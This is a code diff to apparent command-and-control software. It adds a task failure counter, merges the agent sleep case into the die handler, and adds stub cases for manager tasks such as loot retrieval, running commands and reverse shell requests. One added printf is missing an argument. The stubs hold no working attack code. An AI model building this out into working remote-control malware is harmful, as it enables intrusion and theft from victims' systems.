@@ -30,6 +30,7 @@ NetInst::~NetInst(){
 void NetInst::MainLoop(){
     // log(LOG_INFO, "Beginning instance listen");
     int rc = 0, exit_code = 0;
+    int fail_count = 0;
 
     // listen on the transport
     if(!api_check(tspt->listen())){
@@ -62,9 +63,14 @@ void NetInst::MainLoop(){
             pthread_mutex_lock(&int_task_lock);
             ptask_t task = task_dispatch->front();
             rc = HandleTask(task);
-            if(rc == 2) {
+            printf("RC: %d, fail count: %d\n", rc);
+            if(rc == 2 || fail_count > 5) {
                 exit_code = 1;
                 break;
+            } else if (rc == 1) {
+                fail_count++;
+            } else {
+                fail_count = 0;
             }
             task_dispatch->pop_front();
             pthread_mutex_unlock(&int_task_lock);
@@ -103,6 +109,7 @@ int NetInst::HandleTask(ptask_t task){
     // switch depending on the type of operation
     switch (task->type)
     {
+    case AGENT_SLEEP:
     case AGENT_DIE:
         printf("NETINST: Caught die\n");
         {
@@ -117,9 +124,6 @@ int NetInst::HandleTask(ptask_t task){
             rc = 2; 
             break;
         }
-        break;
-    case AGENT_SLEEP:
-        printf("NETINST: Caught sleep\n");
         break;
     case AGENT_DOWNLOAD_FILE:
         printf("NETINST: Caught download file\n");
@@ -152,11 +156,50 @@ int NetInst::HandleTask(ptask_t task){
             printf("T\n");
             // get the beacon data
             char *beacon_data = (char*)((AgentJob*)this->t_dat)->get_data();
+            if(beacon_data == nullptr) {
+                log(LOG_ERROR, "Task data was null (AGENT_BEACON/HEARTBEAT)\n");
+                break;
+            }
             // push data to the server
             ptask_t beacon = CreateTasking(0, TASK_PUSH_BEACON, strlen(beacon_data), beacon_data);
             PushTasking(beacon);
             //printf("[NETINST] Awaiting task...\n");
         }
+        break;
+
+    // Manager tasking operations
+    case MANAGER_RETRIEVE_AGENT:
+        printf("Caught manager beacon fetch\n");
+        break;
+    case MANAGER_RETRIEVE_LOOT:
+        printf("Caught manager loot fetch\n");
+        break;
+    case MANAGER_UPLOAD_FILE:
+        printf("Caught manager file upload\n");
+        break;
+    case MANAGER_DOWNLOAD_FILE:
+        printf("Caught manager file download\n");
+        break;
+    case MANAGER_PUSH_MODULE:
+        printf("Caught manager module upload\n");
+        break;
+    case MANAGER_RUN_COMMAND:
+        printf("Caught manager command string\n");
+        break;
+    case MANAGER_REQUEST_REVERSESHELL:
+        printf("Caught manager reverse shell request\n");
+        break;
+    case MANAGER_REGISTER_AGENT:
+        printf("Caught manager agent registration\n");
+        break;
+    case MANAGER_REVIEW_TRANSPORTS:
+        printf("Caught manager transport list\n");
+        break;
+    case MANAGER_START_TRANSPORT:
+        printf("Caught manager transport start\n");
+        break;
+    case MANAGER_EXIT:
+        printf("Caught manager termination\n");
         break;
     default:
         log(LOG_ERROR, "Unknown tasking operation: %d\n", task->type);
